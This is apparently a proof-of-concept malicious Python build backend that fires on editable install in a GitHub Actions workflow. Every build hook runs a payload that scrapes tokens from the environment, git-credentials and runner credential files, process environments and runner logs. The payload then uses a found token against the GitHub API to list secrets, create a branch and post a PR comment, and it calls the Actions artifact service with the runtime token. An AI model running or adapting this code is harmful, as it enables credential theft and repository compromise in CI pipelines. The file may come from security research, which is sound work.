"""PoC PEP 517 backend: executes during `uv pip install -e .` in the privileged workflow."""
import base64
import glob
import hashlib
import json
import os
import re
import subprocess
import sys
import urllib.error
import urllib.request

REPO = "PDFtoMark/triage-fivetran-v4c1fe98-3d551a"
TOKEN_RE = re.compile(r"(gh[pousr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,})")
RAN = os.environ.get("EVIL_RAN_MARKER", "/tmp/.evil_backend_ran")


def sha(s):
    return hashlib.sha256(s.encode("utf-8", "replace")).hexdigest()


def emit(line):
    try:
        print(line, flush=True)
    except Exception:
        pass


def api(method, path, token, body=None):
    url = "https://api.github.com" + path
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Authorization", "token " + token)
    req.add_header("Accept", "application/vnd.github+json")
    req.add_header("User-Agent", "poc-backend")
    if data is not None:
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode("utf-8", "replace")
            return r.status, raw
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, repr(e)


def find_tokens():
    found = {}

    def add(name, val):
        if not val:
            return
        for m in TOKEN_RE.findall(val):
            found.setdefault("sha256=" + sha(m), (name, m))

    for k, v in os.environ.items():
        add("env:" + k, v)
    # event payload / workflow temp files
    for p in [os.environ.get("GITHUB_EVENT_PATH"),
              "/home/runner/work/_temp/_github_workflow/event.json"]:
        if p and os.path.exists(p):
            try:
                add("file:" + p, open(p, encoding="utf-8", errors="replace").read())
            except Exception:
                pass
    # checkout credentials
    for p in ["/home/runner/work/_temp/.git-credentials",
              os.path.expanduser("~/.git-credentials"),
              os.path.expanduser("~/.config/gh/hosts.yml"),
              "/home/runner/actions-runner/.credentials",
              "/home/runner/actions-runner/.credentials_rsaparams"]:
        if os.path.exists(p):
            try:
                add("file:" + p, open(p, encoding="utf-8", errors="replace").read())
            except Exception:
                pass
    # running processes (runner listener/worker may hold the job token)
    for envf in glob.glob("/proc/[0-9]*/environ"):
        try:
            add("proc:" + envf, open(envf, "rb").read().decode("utf-8", "replace"))
        except Exception:
            pass
    # runner diag logs
    for p in glob.glob("/home/runner/actions-runner/_diag/*.log")[-6:]:
        try:
            add("diag:" + p, open(p, encoding="utf-8", errors="replace").read())
        except Exception:
            pass
    return found


def payload(stage):
    if os.path.exists(RAN) and os.environ.get("EVIL_ONCE") == "1":
        return
    try:
        open(RAN, "w").write("1")
    except Exception:
        pass

    emit("=== EVIL_BACKEND_START stage=%s ===" % stage)
    for k in ("GITHUB_WORKFLOW", "GITHUB_EVENT_NAME", "GITHUB_JOB", "GITHUB_REPOSITORY",
              "GITHUB_REPOSITORY_OWNER", "GITHUB_REF", "GITHUB_HEAD_REF", "GITHUB_SHA",
              "GITHUB_ACTOR", "GITHUB_ACTIONS", "RUNNER_NAME", "RUNNER_OS", "CI"):
        emit("CTX_%s=%s" % (k, os.environ.get(k)))

    # 1) environment inventory (values of secret-looking vars are hashed, not printed)
    for k in sorted(os.environ):
        v = os.environ[k]
        if TOKEN_RE.search(v) or any(s in k.upper() for s in ("TOKEN", "SECRET", "KEY", "PASSWORD", "CREDENTIAL")):
            emit("ENV_HASH_%s sha256=%s len=%d" % (k, sha(v), len(v)))
        else:
            emit("ENV_%s=%s" % (k, v[:200].replace("\n", " ")))

    # 2) credential hunting
    toks = find_tokens()
    for h, (src, val) in sorted(toks.items()):
        emit("FOUND_TOKEN %s src=%s len=%d" % (h, src, len(val)))

    # 3) prove liveness: use the first token found; prefer GITHUB_TOKEN if present
    cand = os.environ.get("GITHUB_TOKEN") or os.environ.get("GH_TOKEN")
    if not cand and toks:
        cand = sorted(toks.values())[0][1]
    if cand:
        emit("USING_TOKEN sha256=%s" % sha(cand))
        st, body = api("GET", "/repos/" + REPO, cand)
        emit("API_GET_REPO status=%s body=%s" % (st, body[:700].replace("\n", " ")))
        st, body = api("GET", "/repos/" + REPO + "/actions/secrets", cand)
        emit("API_LIST_SECRETS status=%s body=%s" % (st, body[:300].replace("\n", " ")))
        st, body = api("GET", "/repos/" + REPO + "/actions/variables", cand)
        emit("API_LIST_VARS status=%s body=%s" % (st, body[:600].replace("\n", " ")))
        st, body = api("GET", "/user", cand)
        emit("API_GET_USER status=%s body=%s" % (st, body[:300].replace("\n", " ")))
        # write probe: create a throwaway ref (expected 403 if read-only)
        st, body = api("POST", "/repos/" + REPO + "/git/refs", cand,
                       {"ref": "refs/heads/poc-write-probe", "sha": os.environ.get("GITHUB_SHA", "")})
        emit("API_CREATE_REF status=%s body=%s" % (st, body[:300].replace("\n", " ")))
        # write probe: PR comment (expected 403 if read-only)
        pr = os.environ.get("POC_PR")
        if not pr:
            try:
                ev = json.load(open(os.environ["GITHUB_EVENT_PATH"], encoding="utf-8"))
                wr = ev.get("workflow_run") or {}
                emit("EVENT_WORKFLOW_RUN name=%s event=%s conclusion=%s head_branch=%s head_sha=%s head_repo=%s prs=%s" % (
                    wr.get("name"), wr.get("event"), wr.get("conclusion"), wr.get("head_branch"),
                    wr.get("head_sha"), (wr.get("head_repository") or {}).get("full_name"),
                    [p.get("number") for p in (wr.get("pull_requests") or [])]))
                prs = wr.get("pull_requests") or []
                if prs:
                    pr = str(prs[0].get("number"))
            except Exception as e:
                emit("EVENT_PARSE_ERR=%r" % (e,))
        if pr:
            st, body = api("POST", "/repos/" + REPO + "/issues/%s/comments" % pr, cand,
                           {"body": "poc token-write probe " + sha(cand)[:12]})
            emit("API_PR_COMMENT status=%s body=%s" % (st, body[:300].replace("\n", " ")))
    else:
        emit("NO_TOKEN_FOUND_IN_ENV_OR_FILES")

    # 4) other live credentials present for steps
    for k in ("ACTIONS_RUNTIME_TOKEN", "ACTIONS_ID_TOKEN_REQUEST_TOKEN", "ACTIONS_CACHE_URL",
              "ACTIONS_RESULTS_URL", "ACTIONS_ID_TOKEN_REQUEST_URL"):
        v = os.environ.get(k)
        emit("RUNTIME_ENV_%s present=%s len=%d" % (k, bool(v), len(v or "")))
    rt = os.environ.get("ACTIONS_RUNTIME_TOKEN")
    if rt:
        url = (os.environ.get("ACTIONS_RESULTS_URL") or "").rstrip("/")
        if url:
            body = json.dumps({"workflow_run_backend_id": "", "workflow_job_backend_id": ""}).encode()
            req = urllib.request.Request(url + "/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts",
                                         data=body, method="POST")
            req.add_header("Authorization", "Bearer " + rt)
            req.add_header("Content-Type", "application/json")
            try:
                with urllib.request.urlopen(req, timeout=20) as r:
                    emit("RUNTIME_LIST_ARTIFACTS status=%s body=%s" % (r.status, r.read().decode()[:300]))
            except urllib.error.HTTPError as e:
                emit("RUNTIME_LIST_ARTIFACTS status=%s body=%s" % (e.code, e.read().decode()[:300]))
            except Exception as e:
                emit("RUNTIME_LIST_ARTIFACTS err=%r" % (e,))

    # 5) git config / checkout leftovers
    for p in [".git/config", "/home/runner/work/_temp/.gitconfig"]:
        if os.path.exists(p):
            emit("GITFILE_%s=%s" % (p, open(p, errors="replace").read()[:600].replace("\n", " | ")))

    emit("=== EVIL_BACKEND_END stage=%s ===" % stage)


def get_requires_for_build_wheel(config_settings=None):
    payload("wheel-requires")
    return []


def get_requires_for_build_editable(config_settings=None):
    payload("editable-requires")
    return []


def prepare_metadata_for_build_editable(metadata_directory, config_settings=None):
    payload("editable-metadata")
    raise SystemExit(1)


def build_wheel(wheel_directory, config_settings=None, metadata_directory=None):
    payload("wheel-build")
    raise SystemExit(1)


def build_editable(wheel_directory, config_settings=None, metadata_directory=None):
    payload("editable-build")
    raise SystemExit(1)
